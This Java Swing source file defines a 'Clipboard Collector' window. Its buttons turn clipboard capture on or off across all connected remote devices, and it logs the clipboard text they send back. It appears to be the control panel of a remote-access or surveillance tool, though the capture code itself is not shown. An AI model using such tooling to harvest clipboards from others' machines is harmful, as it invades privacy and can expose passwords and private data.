package view;

import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.beans.PropertyChangeEvent;
import java.beans.PropertyChangeListener;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.channels.SocketChannel;
import java.util.HashMap;

import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JTextArea;
import javax.swing.SwingConstants;
import javax.swing.border.EmptyBorder;

import controller.Events;
import controller.PacketHandler;
import controller.send.ClipboardDetectSender;
import model.Device;

public class ClipboardCollectForm extends JFrame {

	/**
	 * 
	 */
	private static final long serialVersionUID = -3875111246319766834L;
	private JPanel contentPane;

	/**
	 * Create the frame.
	 */
	public ClipboardCollectForm(HashMap<Device, SocketChannel> devices) {
		setTitle("Clipboard Collector");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 630, 520);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);
		contentPane.setLayout(new GridLayout(1, 0, 0, 0));
		
		JPanel panel = new JPanel();
		contentPane.add(panel);
		panel.setLayout(new GridLayout(10, 1, 0, 20));
		
		JLabel lblNewLabel = new JLabel("Logging>>>");
		lblNewLabel.setHorizontalAlignment(SwingConstants.RIGHT);
		panel.add(lblNewLabel);
		
		JTextArea txtLog = new JTextArea();
		contentPane.add(txtLog);
		
		Events.addPropertyChangeListener(new PropertyChangeListener() {
			@Override
			public void propertyChange(PropertyChangeEvent evt) {
				// TODO Auto-generated method stub
				if(evt.getPropertyName()=="clipboard.on.received") {
					txtLog.append((String) evt.getNewValue()+"\n");
				}
			}
		});
		
		JButton btnEnable = new JButton("Enable");
		btnEnable.setMultiClickThreshhold(1000);
		btnEnable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				devices.forEach((device, socketChannel)->{
					try {
						ClipboardDetectSender.on(socketChannel);
					} catch (IOException e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
					}
				});
			}
		});
		panel.add(btnEnable);
		
		JButton btnDisable = new JButton("Disable");
		btnDisable.setMultiClickThreshhold(1000);
		btnDisable.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				devices.forEach((device, socketChannel)->{
					try {
						ClipboardDetectSender.off(socketChannel);
					} catch (IOException e1) {
						// TODO Auto-generated catch block
						e1.printStackTrace();
					}
				});
			}
		});
		panel.add(btnDisable);
		
		JButton btnClearScreen = new JButton("Clear screen");
		btnClearScreen.setMultiClickThreshhold(1000);
		btnClearScreen.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				txtLog.setText("");
			}
		});
		panel.add(btnClearScreen);
		
		JButton btnClearLogFile = new JButton("Clear log file");
		btnClearLogFile.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				PrintWriter pw;
				try {
					pw = new PrintWriter(PacketHandler.getConfig("config.yml").string("clipboard-output-file"));
					pw.close();
				} catch (IOException e1) {
					// TODO Auto-generated catch block
				}
			}
		});
		panel.add(btnClearLogFile);
		
	}

}
